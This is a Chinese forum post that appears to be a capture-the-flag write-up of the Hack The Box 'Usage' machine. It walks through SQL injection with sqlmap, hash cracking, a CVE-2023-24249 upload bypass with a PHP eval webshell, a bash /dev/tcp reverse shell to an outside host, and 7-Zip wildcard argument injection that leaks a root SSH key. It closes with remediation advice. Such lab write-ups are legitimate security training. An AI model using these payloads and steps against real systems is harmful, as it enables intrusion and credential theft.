---
title: "历时八小时,拿下HTB Usage靶机，附详细渗透测试记录"
source: "https://linux.do/t/topic/544680"
author:
  - "[[user792]]"
published: 2026-05-09
created: 2026-05-09
---
I just pwned Usage on Hack The Box! [https://www.hackthebox.com/achievement/machine/2283976/597](https://www.hackthebox.com/achievement/machine/2283976/597) #HackTheBox #htb #CyberSecurity #EthicalHacking #InfoSec #PenTesting 

[![[535c4106e75479ed332da2cfaa874640_MD5.jpg]]

image702×636 83.8 KB](https://cdn3.ldstatic.com/original/4X/a/2/c/a2cc1463a601bbc808db5907a970f4d36e331913.jpeg "image") 

打到一半HTB的新加坡节点抽大风，连不上，重新连的欧洲节点打完了，烦死了

以下是详细渗透测试记录

# HTB Usage 渗透测试详细记录

## 摘要

本文记录了对HTB Usage的渗透测试全过程，包括初始侦察、服务探测、漏洞发现、初始访问获取、权限提升等阶段。成功利用了SQL注入、文件上传漏洞及命令注入漏洞，最终获取了系统的root权限。

## 关键技术

- SQL注入漏洞利用（布尔盲注、时间盲注）
- Laravel框架漏洞利用（CVE-2023-24249）  
	Laravel 框架漏洞利用（CVE-2023-24249）
- 7-Zip参数注入漏洞利用

## 1\. 初始侦察阶段

首先进行全端口扫描，快速识别开放的服务：

```bash
nmap -sT -min-rate 10000 -p- 10.10.11.18
```

**命令参数解释：**

- `-sT`：执行完整的TCP连接扫描，相对更可靠但速度较慢
- `-min-rate 10000`：设置最小发包速率为10000包/秒，大幅提高扫描速度
- `-p-`：扫描所有65535个TCP端口
- `10.10.11.18`：目标IP地址

**扫描结果：**

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

发现目标开放了SSH(22)和HTTP(80)两个服务，为下一步深入探测提供了方向。

## 2\. 服务探测与信息收集

对已发现的开放端口进行更详细的服务版本探测：

```bash
nmap -sT -sC -sV -O -p22,80 10.10.11.18
```

**命令参数解释：**

- `-sC`：使用默认脚本进行扫描，执行一些安全相关的探测脚本
- `-sV`：探测服务版本信息
- `-O`：尝试识别目标操作系统
- `-p22,80`：只扫描特定的端口，提高效率

**扫描结果：**

```ruby
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
```

从扫描结果发现：

1. SSH服务运行的是OpenSSH 8.9p1，宿主系统为Ubuntu
2. HTTP服务使用nginx 1.18.0，重定向到域名`usage.htb`

接下来我们需要添加域名解析以便访问网站：

```bash
echo "10.10.11.18 usage.htb" >> "/etc/hosts"
```

访问`http://usage.htb/`后，发现一个子域名`admin.usage.htb`，同样需要添加解析：

```bash
echo "10.10.11.18 admin.usage.htb" >> "/etc/hosts"
```

### 网站指纹识别

使用whatweb工具进行网站技术栈识别：

```bash
whatweb http://usage.htb/
```

**结果分析：**

```wasm
http://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

从识别结果可以得出以下信息：

- 网站是使用PHP语言编写
- 使用Laravel框架
- 前端使用Bootstrap 4.1.3
- Web服务器是nginx 1.18.0，运行在Ubuntu系统上

## 3\. 漏洞识别与初始访问

### 尝试Laravel Ignition漏洞

经过搜索得知，Laravel Ignition 2.5.1存在代码执行漏洞（CVE-2021-3129），尝试进行验证，打开burpsuite抓包 ，对usage.htb、admin.usage.htb发送poc验证，返回值404,验证失败  
验证漏洞poc如下

```swift
POST /_ignition/execute-solution HTTP/1.1
Host: 
Content-Type: application/json
Content-Length: 168

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "xxxxxxx"
  }
}
EU VIP 13
```

### SQL注入漏洞发现

在登录页面的密码重置功能中发现可能存在SQL注入漏洞。通过发送特殊字符测试：

```ini
email=admin%40admin.com%27
```

服务器返回500错误，表明存在潜在的SQL注入问题。继续测试SQL注入闭合方式：

```css
admin@admin.com'-- -
```

成功闭合SQL语句，服务器返回正常错误信息而非500服务器错误，证实了SQL注入漏洞的存在。

### 确定SQL注入点的列数

使用UNION SELECT语句测试表的列数：

```css
admin@admin.com' UNION SELECT 1,2,3,4,5,6,7,8-- -
```

经过多次尝试，发现使用8列时可以成功执行，确定表有8列。

### 使用SQLMap自动化利用

在手工尝试很多payload无果后，决定使用SQLMap进行自动化探测：

保存POST /forget-password 完整请求包为sql.req

```bash
sqlmap -r sql.req -p email --level 5 --risk 3 --technique=B --batch
```

**命令参数解释：**

- `-r sql.req`：加载保存的HTTP请求文件
- `-p email`：指定测试参数为email
- `--level 5`：设置测试级别为最高（5），测试所有可能的注入点
- `--risk 3`：设置风险等级为最高（3），尝试更具攻击性的测试载荷
- `--technique=B`：只使用布尔盲注技术
- `--batch`：使用默认选项，无需人工干预

SQLMap确认存在布尔盲注漏洞：

```yaml
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=WY2A2NuNqqqLJ1EMLmaBmIZoTZeWtEEEDPTvr8yW&email=admin@admin.com' AND 8962=(SELECT (CASE WHEN (8962=8962) THEN 8962 ELSE (SELECT 4561 UNION SELECT 6545) END))-- VpQa
```

确定数据库信息

```yaml
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
```

再次执行SQLMap，发现也存在时间盲注漏洞：

```bash
sqlmap -r sql.req -p email --level 5 --risk 3 --batch
Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=WY2A2NuNqqqLJ1EMLmaBmIZoTZeWtEEEDPTvr8yW&email=admin@admin.com' AND 2637=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- oQJg
```

### 数据库信息枚举

列出所有数据库：

```bash
sqlmap -r sql.req -p email --dbms=mysql --technique=B --threads=5 --delay=0 --timeout=5 --level 1 --risk 1 --dbs --batch
```

**命令参数解释：**

- `--dbms=mysql`：指定目标数据库类型为MySQL
- `--threads=5`：使用5个线程提高速度
- `--delay=0`：请求间无延迟
- `--timeout=5`：连接超时时间为5秒
- `--dbs`：枚举所有数据库

**结果：**

```css
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```

列出`usage_blog`数据库中的所有表：

```bash
sqlmap -r sql.req --level 5 --risk 3 --threads 10 -p email --technique=B --batch -D usage_blog --tables
```

**命令参数解释：**

- `-D usage_blog`：指定要查询的数据库
- `--tables`：枚举指定数据库中的所有表

发现了15个表，其中`admin_users`表可能包含有价值的信息。

```diff
[15 tables]
+------------------------+
| admin_m                |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```

### 提取管理员凭据

获取`admin_users`表中的数据：

```bash
sqlmap -r sql.req --level 5 --risk 3 --threads 10 -p email --technique=B --batch -D usage_blog -T admin_users --dump
```

**命令参数解释：**

- `-T admin_users`：指定要查询的表
- `--dump`：提取表中的所有数据

成功获取管理员哈希密码：

```
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
```

### 破解密码哈希

将获取的哈希值保存到文件中：

```bash
echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' >> hash
```

使用hashcat进行破解：

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

**命令参数解释：**

- `-m 3200`：指定哈希类型为bcrypt，对应Laravel使用的密码哈希算法
- `hash`：包含哈希值的文件
- `/usr/share/wordlists/rockyou.txt`：使用rockyou字典进行暴力破解

成功破解密码为：`whatever1`

### 获取后台访问

使用破解的凭据登录管理后台[http://admin.usage.htb/：](http://admin.usage.htb/%EF%BC%9A)

```undefined
用户名：admin
密码：whatever1
```

成功登录后，在后台页面列出了各个组件的版本

```bash
Dependencies
php	^8.1
encore/laravel-admin	1.8.18
guzzlehttp/guzzle	^7.2
laravel/framework	^10.10
laravel/sanctum	^3.2
laravel/tinker	^2.8
symfony/filesystem	^6.3
```

发现后台使用的Laravel-admin版本为1.8.18，该版本存在CVE-2023-24249漏洞，即任意文件上传漏洞。

## 4\. 横向移动

### 利用Laravel-admin文件上传漏洞

根据CVE-2023-24249漏洞描述，该漏洞允许攻击者绕过文件上传限制，上传PHP文件从而执行远程代码。

参考地址 [CVE-2023-24249 | flyD](https://flyd.uk/post/cve-2023-24249/)

攻击步骤：

- 登录 Laravel-admin 后台
- 进入"用户设置"界面
- 尝试修改用户头像并保存，同时捕获请求数据包
- 上传一个以 .jpg 扩展名结尾的 PHP 文件
- 上传成功后，重放请求并修改文件名为 “.php”（例如：php.jpg.php）
- 刷新用户设置界面，提示上传成功，可以获取 PHP 文件的地址
- PHP 文件被执行

攻击流程：

1. 在本地设置监听：
	```bash
	nc -lvnp 9999
	```
2. 构造反弹shell语句
	```php
	bash -c 'bash -i >& /dev/tcp/10.10.16.6/9999 0>&1'
	```
3. 构造php的webshell
	```php
	<?php @eval($_POST['a']) ?>
	```
	保存为php.jpg
4. 上传PHP webshell：
	- 先正常上传`php.jpg`作为头像
		- 再次上传同一文件，但拦截请求并修改文件名为`php.jpg.php`
		- 放行修改后的请求
5. 快速打开中国蚁剑连接webshell：
- URL：`http://admin.usage.htb/uploads/images/php.jpg.php`
- 密码：`a`
6. 快速打开蚁剑的虚拟终端执行反弹shell命令：
	```bash
	bash -c 'bash -i >& /dev/tcp/10.10.16.6/9999 0>&1'
	```

**注意**：必须**快速**执行以上步骤，因为目标系统有定时清理脚本，上传的webshell大约10秒后会被删除。

成功获取反弹shell：

```ruby
nc -lvnp 9999
listening on [any] 9999 ...

connect to [10.10.16.6] from (UNKNOWN) [10.10.11.18] 56374
bash: cannot set terminal process group (1225): Inappropriate ioctl for device
bash: no job control in this shell
dash@usage:/var/www/html/project_admin/public/uploads/images$ id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

### 优化shell

使用以下命令获取更好的交互式shell：

```bash
script /dev/null -c bash
```

## 5\. 权限提升前的信息收集

进入用户主目录，获取第一个flag：

```bash
cd /home/dash
cat user.txt
# 7c84f22e1f7204b2d24c7a7f164eed48
```

检查系统上的其他用户：

```bash
ls -al /home
```

发现另一个用户`xander`：

```yaml
total 16
drwxr-xr-x  4 root   root   4096 Aug 16  2023 .
drwxr-xr-x 19 root   root   4096 Apr  2  2024 ..
drwxr-x---  6 dash   dash   4096 Apr  9 13:54 dash
drwxr-x---  4 xander xander 4096 Apr  2  2024 xander
```

继续检索`dash`用户目录中的文件：

```bash
ls -al
```

在文件列表中发现了一个值得注意的配置文件`.monitrc`：

```diff
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
```

检查`.monitrc`文件内容，发现密码：`3nc0d3d_pa$$w0rd`

## 6\. 权限提升

### 从dash用户切换到xander用户

尝试密码复用，通过SSH登录xander用户：

```bash
ssh xander@usage.htb
# 密码：3nc0d3d_pa$$w0rd
```

成功登录后，检查xander用户的sudo权限：

```bash
sudo -l
```

**结果：**

```bash
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

发现xander可以无密码执行`/usr/bin/usage_management`二进制文件。

### 分析usage\_management二进制文件

执行该二进制文件：

```bash
sudo /usr/bin/usage_management
```

显示了三个选项：

```markdown
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
```

选择第一个选项，观察输出：

```yaml
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17946 files, 113878980 bytes (109 MiB)

Creating archive: /var/backups/project.zip

Items to compress: 20930

Files read from disk: 17946
Archive size: 54830037 bytes (53 MiB)
Everything is Ok
```

查看二进制文件中包含的字符串：

```bash
strings /usr/bin/usage_management
```

观察到有一条包含通配符的命令，并且程序开头显示了system字符，这意味着一旦命令构造不当或没有适当过滤用户输入，就会造成命令注入漏洞

```swift
/var/www/html：程序尝试切换到这个目录
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *：执行的命令，使用7za（7-Zip的命令行版本）创建压缩文件
```
- a：添加文件到存档
- \-tzip：指定zip格式
- \-snl：存储符号链接为链接（不跟随链接内容）
- \-mmt：使用多线程
- – \*：压缩当前目录中的所有文件

### 利用7-Zip参数注入漏洞

经过分析，这里存在一个任意文件读取漏洞。此漏洞涉及Linux中命令行通配符(\*)与某些应用程序对特殊文件名的处理方式之间的交互。特别是针对7-Zip(7za)的命令行版本，很巧妙。

**漏洞原理详解：**

当7-Zip处理文件名时，有一个特殊的约定：以@开头的参数被视为"列表文件"。这意味着7-Zip会尝试读取@后面指定的文件，并将其内容解释为要处理的文件列表。  
在使用通配符(\*)的命令中，shell会先展开通配符，然后将匹配的所有文件名作为参数传递给命令。这就创造了一个利用机会。

**利用步骤详解**：

首先，创建两个特殊文件：

一个名为@key的文件（文件内容不重要）  
另一个名为key的符号链接，指向/root/.ssh/id\_rsa

当usage\_management脚本执行选项1时，它会运行：

```php
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

Shell展开通配符后，命令变成：

```php
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- @key key [其他文件]
```

7za看到@key参数，会尝试读取名为key的文件，并将key解释为文件列表

但key是一个符号链接，指向/root/.ssh/id\_rsa

所以说，如果key不是文件列表，7za就会在错误信息中展示key指向的文件，从而泄露文件内容  
这是一个经典的"**参数注入**"攻击，利用了通配符展开与程序特殊参数处理之间的交互。这种攻击特别危险，因为即使程序本身没有直接的命令注入漏洞，仍然可以通过这种方式读取系统上的敏感文件。

攻击流程如下：

1. 切换到备份操作的目录：
	```bash
	cd /var/www/html
	```
2. 创建特殊文件：
	```bash
	touch @exp
	```
3. 创建指向root SSH私钥的符号链接：  
	（实际上可以直接链接/root/root.txt 获得flag ln -fs /root/root.txt exp）
	```bash
	ln -fs /root/.ssh/id_rsa exp
	```
4. 执行备份功能触发漏洞：
	```bash
	sudo /usr/bin/usage_management
	# 选择选项 1
	```
5. 程序执行时，shell会展开通配符，7za命令会解释@exp参数并读取exp符号链接指向的文件，从而在错误信息中泄露文件内容。  
	节选输出如下
	```php
	-----BEGIN OPENSSH PRIVATE KEY-----
	WARNING: No more files
	b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
	WARNING: No more files
	QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
	WARNING: No more files
	QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
	WARNING: No more files
	AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
	WARNING: No more files
	H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
	WARNING: No more files
	-----END OPENSSH PRIVATE KEY-----
	2984 folders, 17947 files, 113879379 bytes (109 MiB)
	Updating archive: /var/backups/project.zip
	Items to compress: 20931
	Files read from disk: 17947
	Archive size: 54830172 bytes (53 MiB)
	Scan WARNINGS for files and folders:
	-----BEGIN OPENSSH PRIVATE KEY----- : No more files
	b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
	QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
	QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
	AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
	H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
	-----END OPENSSH PRIVATE KEY----- : No more files
	----------------
	```

去除 : No more files 保存私钥：

```diff
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```
1. 保存私钥并设置正确权限：
	```bash
	chmod 600 key
	```
2. 使用私钥SSH登录root账户：
	```bash
	ssh -i key root@usage.htb
	```
3. 获取root flag：
	```bash
	root@usage:~# whoami;cat root.txt
	root
	5b1a42de14a707ebb1a8a7c55fd42730
	```

## 7\. 总结与安全建议

### 安全漏洞列表

1. **SQL注入漏洞**
	- 位置：密码重置功能中的email参数
		- 类型：布尔盲注和时间盲注
		- 严重性：高
2. **Laravel-admin文件上传漏洞 (CVE-2023-24249)**
	- 位置：用户头像上传功能
		- 类型：任意文件上传
		- 严重性：高
3. **密码存储不安全**
	- 位置：.monitrc配置文件
		- 类型：明文密码存储
		- 严重性：中
4. **7-Zip参数注入漏洞**
	- 位置：usage\_management备份功能
		- 类型：命令注入
		- 严重性：高

### 风险等级评估

- **总体风险：高** - 存在多个高危漏洞，可导致完整的系统接管

### 详细修复建议

1. **SQL注入漏洞修复**
	- 使用参数化查询或预处理语句处理所有用户输入
		- 实施输入验证，特别是对email字段进行严格的格式验证
		- 使用ORM框架的安全特性代替原始SQL查询
2. **文件上传漏洞修复**
	- 更新Laravel-admin至最新版本（至少1.8.19以上）
		- 实施严格的文件类型验证，不仅检查扩展名，还应检查文件内容
		- 使用安全的文件命名策略，避免直接使用用户提供的文件名
3. **密码存储安全**
	- 避免在配置文件中存储明文密码
		- 使用环境变量或安全的密钥管理系统存储敏感凭据
		- 定期轮换密码和凭据
4. **命令注入漏洞修复**
	- 避免在脚本中使用shell通配符（特别是在特权脚本中）
		- 使用绝对路径指定要压缩的文件和目录，而非通配符
		- 实施严格的输入验证和命令参数过滤
		- 考虑使用库函数代替外部命令，减少命令注入风险

### 预防类似问题的安全策略

1. **代码安全审计**
	- 定期对Web应用代码进行安全审计
		- 使用静态代码分析工具自动检测潜在安全问题
2. **依赖管理**
	- 建立定期更新第三方库和框架的流程
		- 使用依赖扫描工具监控已知漏洞
3. **特权访问管理**
	- 实施最小权限原则，特别是对于sudo权限
		- 审核所有具有特权执行权限的脚本和二进制文件
4. **安全监控**
	- 部署入侵检测系统监控异常活动
		- 实施文件完整性监控，特别是对网站文件和系统二进制文件
5. **渗透测试**
	- 定期进行内部和外部渗透测试
		- 对新功能上线前进行安全测试

## 8\. 漏洞利用路径总结

### 完整攻击链路图

1. **端口扫描**
	- 发现开放端口22(SSH)和80(HTTP)
2. **Web服务识别**
	- 识别HTTP服务指向usage.htb
		- 发现admin.usage.htb子域名
3. **SQL注入发现与利用**
	- 在密码重置功能发现SQL注入
		- 通过SQLMap自动化利用注入点
		- 获取数据库结构和admin用户凭据
4. **密码哈希破解**
	- 使用hashcat破解admin密码哈希
		- 获得凭据：admin:whatever1
5. **管理后台访问**
	- 登录admin.usage.htb后台
		- 发现Laravel-admin 1.8.18版本
6. **文件上传漏洞利用**
	- 利用CVE-2023-24249上传PHP webshell
		- 获取反弹shell（用户dash）
7. **横向移动**
	- 从.monitrc文件中发现密码
		- 使用SSH登录xander用户
8. **特权提升**
	- 发现sudo权限可执行usage\_management
		- 分析发现7-Zip参数注入漏洞
		- 利用漏洞获取root SSH私钥
		- 使用SSH私钥获取root权限

### 各阶段关键点总结

1. **侦察与发现阶段**
	- 关键点：细致的端口扫描和服务版本识别
		- 启示：全面的信息收集是成功渗透的基础
2. **漏洞发现阶段**
	- 关键点：发现并验证SQL注入，使用自动化工具提高效率
		- 启示：尝试不同的注入技术，结合手动和自动化方法
3. **初始访问阶段**
	- 关键点：识别并利用文件上传漏洞
		- 启示：注意绕过安全控制的细节，如修改文件名
4. **横向移动阶段**
	- 关键点：发现密码复用
		- 启示：仔细检查配置文件中的敏感信息
5. **特权提升阶段**
	- 关键点：分析权限和二进制文件特点
		- 启示：理解系统命令并识别潜在的参数注入点

### 攻击向量简明展示

```scss
端口扫描 → Web应用(80) → SQL注入 → Admin凭据
→ 管理后台 → 文件上传漏洞 → Web Shell → 用户权限(dash)
→ 密码复用 → 用户权限(xander) → Sudo权限
→ 7-Zip参数注入 → Root SSH密钥 → Root权限
```

这份记录完整展现了我是如何层层深入，组合利用多个漏洞最终获取系统的完整控制权的过程。